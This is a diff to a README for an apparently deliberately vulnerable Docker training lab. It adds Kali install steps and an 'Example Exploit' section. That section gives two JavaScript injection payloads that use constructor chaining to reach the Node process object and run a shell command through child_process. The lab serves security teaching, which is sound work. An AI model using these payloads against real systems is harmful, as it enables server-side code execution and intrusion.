@@ -33,4 +33,36 @@ git clone https://github.com/YOUR_USERNAME/ssei-lab.git
 cd ssei-lab
 sudo docker build -t ssei-lab .
 ```
+#### On Kali Use the following
 
+```bash
+sudo apt update
+sudo apt install -y docker.io
+sudo systemctl start docker
+git clone https://github.com/YOUR_USERNAME/ssei-lab.git
+cd ssei-lab
+sudo docker build -t ssei-lab .
+```
+
+### Step 2: Run the Docker
+
+```bash
+sudo docker run -p 3000:3000 ssei-lab
+```
+
+Then visit http://localhost:3000
+
+### 🎯 Example Exploit
+Once running, enter this payload into the input field:
+```js
+[]["constructor"]["constructor"]("return process")()
+```
+
+Or for command execution:
+```js
+[]["constructor"]["constructor"]("return global.process.mainModule.require('child_process').execSync('id').toString()")()
+```
+
+### 🔐 Disclaimer
+
+This is for educational purposes only. Do NOT deploy this lab on a public server or use it for anything unethical.
